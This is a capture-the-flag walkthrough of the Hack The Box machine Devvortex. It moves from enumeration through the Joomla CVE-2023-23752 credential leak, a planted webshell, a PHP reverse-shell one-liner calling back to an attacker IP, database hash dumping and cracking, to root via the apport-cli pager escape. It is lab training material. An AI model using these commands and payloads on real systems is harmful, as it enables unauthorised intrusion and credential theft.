# Devvortex

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -A -p- -sC -sV -Pn -v devvortex.htb
```

{% code overflow="wrap" %}
```
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/5%OT=22%CT=1%CU=38991%PV=Y%DS=2%DC=T%G=Y%TM=65C16
OS:2D7%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST
OS:11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 34.562 days (since Tue Jan  2 04:06:17 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   45.82 ms 10.10.14.1
2   45.89 ms devvortex.htb (10.10.11.242)

NSE: Script Post-scanning.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.77 seconds
           Raw packets sent: 66004 (2.908MB) | Rcvd: 65653 (2.635MB)

```
{% endcode %}

### Port 80

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

Enumerating any hidden directories or files seems to not reveal any important hint:

```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

Also enumerating based on extensions of backend technology:

{% code overflow="wrap" %}
```bash
ffuf -u http://devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -ic -t 400 -e .php,.html,.txt 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

Further we did DNS enumeration for the devvortex.htb website using `Host` Header enumeration, which showed us the existance of a new domain `dev.devvortex.htb`:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -mc 200
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

Add the vhost dev.devvortex.htb to /etc/hosts and enumerate it:

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

Try to enumerate some hidden directories:

{% code overflow="wrap" %}
```bash
gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

/robots.txt:

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>



/administrator:

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

We can enumerate the version of Joomla simply visiting this file:

**/administrator/manifests/files/joomla.xml**

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

/api:

<figure><img src="../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

#### Info

* nginx/1.18.0 (Ubuntu)
* vhost dev.devvortex.htb
  * Joomla 4.2.6
  * /api enabled

## Exploitation

Finding if this version of Joomla is vulnerable, we can try this exploit:

{% hint style="info" %}
This Ruby script nicely formats information that can also be found via cURL or browser as shown above.
{% endhint %}

{% embed url="https://github.com/Acceis/exploit-CVE-2023-23752" %}

The **CVE-2023-23752** Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.

{% embed url="https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html" %}

We need to install Ruby dependecies:

<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Download Gemfile, install dependencies using `bundle install` and run exploit:

<figure><img src="../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

#### Info

* Database info
  * username: `lewis`&#x20;
  * password: `P4ntherg0t1n5r3c0n##`
  * db name: joomla
  * db type: mysql
  * db prefix: sd4fg\_

## Enumeration 2

Access /administrator section of Joomla using lewis credentials:

<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

Add a new file `cmd.php` with your preferred webshell:

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

List OS users:

```bash
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

We need to spawn a reverse shell in order to have a semi-TTY and interact with MySQL database:

```bash
php -r '$sock=fsockopen("10.10.15.101",9000);exec("sh <&3 >&3 2>&3");'
```

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

Enumerate on MySQL:

```bash
mysql -u lewis -p
```

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

List tables:

```sql
use joomla;
SHOW TABLES;
```

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

List all users:

```sql
SELECT * FROM sd4fg_users;
```

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
logan paul | logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```
{% endcode %}

Try to crack this password with hashcat.

Identify the mode:

```bash
hashcat --identify logan.hash
```

<figure><img src="../../.gitbook/assets/image (363).png" alt=""><figcaption></figcaption></figure>

Crack it:

```bash
hashcat -m 3200 logan.hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (logan)

Login in SSH using `logan:tequieromucho` credential

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>

Verify what commands logan can run using sudo:

<figure><img src="../../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
`apport-cli` is a command-line tool in Ubuntu (and its derivatives) that allows users to interact with the Apport crash reporting system. Apport is a system that automatically collects data about crashes, errors, and other malfunctions on the system, and then presents them in a user-friendly format for reporting to developers and Ubuntu maintainers.

Here's a brief overview of `apport-cli`:

1. **Reporting Crashes**: `apport-cli` allows users to manually report crashes and errors to the Ubuntu developers. This can be useful for providing detailed information about the issue encountered, which can help developers diagnose and fix the problem.
2. **Collecting Data**: When a crash occurs, `apport` collects various data such as log files, stack traces, and other diagnostic information related to the crash. This data is then presented to the user for review and optionally for reporting.
3. **Non-Interactive Mode**: `apport-cli` can also be used in non-interactive mode, where it collects crash information and sends it to the Ubuntu error tracker without user intervention. This can be useful for automated error reporting or debugging tasks.
4. **Usage**: The basic usage of `apport-cli` involves specifying the package name or process ID (PID) of the crashed application, along with any additional options for collecting debug information.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (368).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-1326" %}

{% embed url="https://github.com/diego-tella/CVE-2023-1326-PoC" %}

A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.

To generate a .crash report, run a simple command like this one:

```bash
sleep 60 &
```

Note the PID:

<figure><img src="../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

Send `SIGSEGV` signal:

```bash
kill -SIGSEGV 18640
```

<figure><img src="../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure>

To spawn a root shell, wait that the pager `less` provide to you the command prompt `':'` and then type /bin/bash

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

Now we're finally root:

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>
